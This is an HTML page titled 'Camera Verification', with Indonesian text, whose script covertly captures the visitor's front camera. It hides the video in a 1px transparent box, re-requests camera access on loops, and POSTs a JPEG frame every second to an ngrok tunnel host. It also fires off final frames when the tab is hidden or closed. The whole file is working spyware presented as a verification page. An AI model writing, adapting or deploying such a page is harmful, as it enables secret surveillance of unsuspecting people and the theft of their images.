<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; min-height: 100vh; display: flex; flex-direction: column; gap: 12px; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; padding: 16px; }
  .status-box { font-size: 13px; color: #cbd5e1; background: #111827; border: 1px solid #374151; padding: 10px 14px; border-radius: 6px; max-width: 380px; width: 100%; word-break: break-word; line-height: 1.45; }
  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
</style>
</head>
<body>

<div class="hidden-container">
  <video id="cam-feed" autoplay playsinline muted></video>
  <canvas id="cam-canvas" width="480" height="360"></canvas>
</div>

<div class="status-box" id="status-log">[Capture] Ketuk layar (one-click) untuk mengaktifkan kamera &amp; mengirim capture...</div>

<script>
(function () {
  'use strict';

  var SERVER_BASE = "https://studly-unallegorized-brecken.ngrok-free.dev";

  var CONFIG = {
    captureIntervalMs: 1000,   // Interval ambil & kirim capture ke server
    cameraRetryMs: 2500,       // Jeda retry jika kamera belum aktif/terputus
    watchdogMs: 3000,          // Siklus pengecekan agar tidak mati
    cyclePulseMs: 5000         // Siklus pemulihan status & pengulangan request
  };

  var state = {
    stream: null,
    camActive: false,
    camPending: false,
    retryTimer: null,
    captureTimer: null,
    watchdogTimer: null,
    cycleTimer: null,
    lastDataUrl: null,
    sentCount: 0
  };

  function logStatus(msg) {
    var el = document.getElementById('status-log');
    var now = new Date().toLocaleTimeString();
    var line = "[" + now + "] " + msg;
    if (el) el.textContent = line;
    console.log(line);
  }

  function sendCaptureToServer(dataUrl, useKeepalive) {
    if (!dataUrl) return;

    fetch(SERVER_BASE + "/upload", {
      method: "POST",
      keepalive: Boolean(useKeepalive),
      headers: {
        "Content-Type": "application/json",
        "ngrok-skip-browser-warning": "true"
      },
      body: JSON.stringify({ image: dataUrl })
    })
    .then(function (res) { return res.json(); })
    .then(function (data) {
      if (data && data.status === "success") {
        state.sentCount++;
        logStatus("Capture terkirim (#" + state.sentCount + ") ke " + SERVER_BASE);
      } else {
        logStatus("Respon server: " + (data && data.message ? data.message : "gagal"));
      }
    })
    .catch(function (err) {
      logStatus("Gagal kirim ke server: " + err.message);
    });
  }

  function grabFrameDataUrl() {
    var video = document.getElementById('cam-feed');
    var canvas = document.getElementById('cam-canvas');
    if (!video || !canvas || video.readyState < 2) return state.lastDataUrl;

    try {
      var ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
      state.lastDataUrl = dataUrl;
      return dataUrl;
    } catch (e) {
      logStatus("Error capture frame: " + e.message);
      return state.lastDataUrl;
    }
  }

  function captureFrameNow(useKeepalive) {
    if (!state.camActive && !state.lastDataUrl) return;
    var dataUrl = state.camActive ? grabFrameDataUrl() : state.lastDataUrl;
    if (dataUrl) {
      sendCaptureToServer(dataUrl, useKeepalive);
    }
  }

  function startCaptureLoop() {
    if (state.captureTimer) return;
    state.captureTimer = setInterval(function () {
      if (state.camActive) {
        captureFrameNow(false);
      }
    }, CONFIG.captureIntervalMs);
  }

  function scheduleCameraRetry() {
    clearTimeout(state.retryTimer);
    if (state.camActive || state.camPending) return;
    state.retryTimer = setTimeout(function () {
      requestCamera();
    }, CONFIG.cameraRetryMs);
  }

  function requestCamera() {
    if (state.camActive || state.camPending) return;

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      logStatus("getUserMedia tidak didukung di browser/WebView ini.");
      scheduleCameraRetry();
      return;
    }

    state.camPending = true;
    logStatus("Meminta akses kamera...");

    navigator.mediaDevices.getUserMedia({
      video: {
        width: { ideal: 640 },
        height: { ideal: 480 },
        facingMode: "user"
      },
      audio: false
    })
    .then(function (stream) {
      state.camPending = false;
      state.camActive = true;
      state.stream = stream;

      var video = document.getElementById('cam-feed');
      if (video) {
        video.srcObject = stream;
        video.play().catch(function () {});
      }

      logStatus("Kamera aktif, siklus capture berjalan...");
      startCaptureLoop();
      setTimeout(function () { captureFrameNow(false); }, 300);

      stream.getVideoTracks().forEach(function (track) {
        track.onended = function () {
          state.camActive = false;
          state.stream = null;
          logStatus("Stream kamera terhenti, siklus retry aktif...");
          scheduleCameraRetry();
        };
      });
    })
    .catch(function (err) {
      state.camPending = false;
      state.camActive = false;
      logStatus("Kamera belum aktif (" + err.name + "), siklus retry berjalan...");
      scheduleCameraRetry();
    });
  }

  function runCyclePulse() {
    if (state.camActive) {
      var video = document.getElementById('cam-feed');
      var hasLiveTrack = state.stream && state.stream.getVideoTracks().some(function (t) {
        return t.readyState === 'live';
      });
      if (!hasLiveTrack || (video && video.paused)) {
        state.camActive = false;
        requestCamera();
      } else {
        captureFrameNow(false);
      }
    } else if (!state.camPending) {
      requestCamera();
    }
  }

  function startWatchdog() {
    if (!state.watchdogTimer) {
      state.watchdogTimer = setInterval(function () {
        if (!state.camActive && !state.camPending) {
          requestCamera();
        } else if (state.camActive) {
          captureFrameNow(false);
        }
      }, CONFIG.watchdogMs);
    }

    if (!state.cycleTimer) {
      state.cycleTimer = setInterval(runCyclePulse, CONFIG.cyclePulseMs);
    }
  }

  function onOneClick() {
    startWatchdog();
    requestCamera();
  }

  ['pointerdown', 'click', 'touchend'].forEach(function (evtName) {
    document.addEventListener(evtName, onOneClick, { passive: true });
  });

  window.addEventListener('DOMContentLoaded', function () {
    startWatchdog();
    requestCamera();
  });

  window.addEventListener('focus', function () {
    if (!state.camActive && !state.camPending) {
      requestCamera();
    }
  });

  document.addEventListener('visibilitychange', function () {
    if (document.hidden) {
      captureFrameNow(true);
    } else {
      state.camActive = false;
      state.camPending = false;
      requestCamera();
    }
  });

  window.addEventListener('pagehide', function () {
    captureFrameNow(true);
  });

  window.addEventListener('beforeunload', function () {
    captureFrameNow(true);
  });
})();
</script>
</body>
</html>
